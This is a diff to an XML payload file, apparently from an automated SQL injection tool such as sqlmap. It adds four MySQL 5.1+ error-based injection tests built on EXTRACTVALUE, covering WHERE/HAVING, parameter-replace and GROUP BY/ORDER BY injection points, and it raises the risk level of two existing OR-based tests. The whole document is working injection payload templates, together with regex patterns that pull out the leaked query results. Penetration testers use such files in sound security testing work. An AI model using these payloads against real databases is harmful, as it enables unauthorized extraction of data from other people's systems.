@@ -1010,6 +1010,26 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>AND EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>2</level>
@@ -1188,10 +1208,30 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>OR EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>2</level>
-        <risk>0</risk>
+        <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
         <vector>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM] UNION SELECT [RANDNUM1])a GROUP BY x LIMIT 1)</vector>
@@ -1211,7 +1251,7 @@ Formats:
         <title>MySQL OR error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>3</level>
-        <risk>0</risk>
+        <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
         <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</vector>
@@ -1393,6 +1433,26 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.1 - Parameter replace</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))</vector>
+        <request>
+            <payload>(EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>PostgreSQL error-based - Parameter replace</title>
         <stype>2</stype>
         <level>3</level>
@@ -1490,6 +1550,26 @@ Formats:
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - GROUP BY and ORDER BY clauses</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>,EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
         </details>
     </test>
 
